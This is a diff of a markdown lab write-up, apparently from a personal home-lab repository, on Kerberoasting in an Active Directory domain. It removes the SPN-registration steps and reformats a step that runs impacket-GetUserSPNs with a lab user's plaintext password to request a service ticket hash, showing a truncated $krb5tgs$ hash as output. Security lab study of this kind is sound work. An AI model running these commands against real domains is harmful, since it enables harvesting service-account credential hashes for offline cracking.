@@ -65,43 +65,20 @@ MSSQLSvc/Infosec.sandeep.local:1433
 
 <img width="660" height="91" alt="image" src="https://github.com/user-attachments/assets/78ce35e2-a542-4371-abdf-8ee4a7db0dde" />
 
+<br>
 
+### 🧑‍💻 STEP 4 — Request the TGS Using Impacket (Kali Linux)
 
+Now run GetUserSPNs to obtain the Kerberos TGS ticket hash.
 
-
-
-
-
-
-✅ STEP 2 — Now assign the SPN
-
-After the user is created, run:
-
-setspn -A MSSQLSvc/Infosec.sandeep.local:1433 sqlsvc
-
-
-You should see:
-
-Registered ServicePrincipalNames for CN=sqlsvc, CN=Users, DC=sandeep, DC=local
-
-🟢 STEP 3 — Verify SPN
-setspn -L sqlsvc
-
-
-Output will show:
-
-MSSQLSvc/Infosec.sandeep.local:1433
-
-
-Now the user is kerberoastable.
-
-🟢 STEP 4 — Run Impacket again from Kali
+### ▶️ Command
 impacket-GetUserSPNs sandeep.local/emma:'Password@123' -dc-ip 192.168.29.193 -request
 
+🟢 Expected Result
 
-This time you WILL get a TGS hash:
+You will now receive a TGS hash:
 
-$krb5tgs$23$*sqlsvc$SANDEEP.LOCAL*...
+$krb5tgs$23$sqlsvc$SANDEEP.LOCAL...
 
 <img width="1063" height="719" alt="image" src="https://github.com/user-attachments/assets/bf257f8b-a5fd-4e59-98c2-ea6f896412e6" />
 
